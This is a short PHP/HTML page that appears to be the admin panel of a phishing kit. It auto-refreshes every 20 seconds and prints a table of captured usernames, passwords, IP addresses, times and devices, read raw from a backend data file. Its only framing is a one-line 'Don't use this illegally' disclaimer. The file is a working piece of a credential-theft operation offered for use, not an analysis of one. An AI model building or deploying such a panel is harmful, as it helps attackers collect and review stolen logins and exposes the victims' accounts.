<!DOCTYPE html>
<html lang="en" dt-pgid="page_home" dt-params="" dt-imp-once="true" dt-imp-end-ignore="true" dt-send-beacon="true">

<head>
    <title> ADMIN PAGE </title>
    <meta name="theme-color" content="'.$theme_color.'" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0" />
     <link rel="stylesheet" href="/css/bootstrap.css"/>
     <meta http-equiv="refresh" content="20" />
</head>

<body>
   <br/>
     <p> Disclaimer:: Don't use this illegally</p>
   <hr/>
  <table class="table table-striped">
     <thead>
        <tr>
           <th scope="col"># </th>
           <th scope="col"> username</th>
           <th scope="col"> password </th>
           <th scope="col"> IP-Address </th>
           <th scope="col"> Time </th>
           <th scope="col"> Device</th>
        </tr>
     </thead>
  <tbody>
                  <?php
                     $file="backend/data2.txt";
                      $myfile = fopen($file, "r");;
                      if(isset($myfile)){
                          echo fread($myfile,filesize($file));
                          fclose($myfile);
                      }else{
                          echo '<tr> No data </tr>';
                      }
                   ?>
  </tbody>
  </table>

</body>
</html>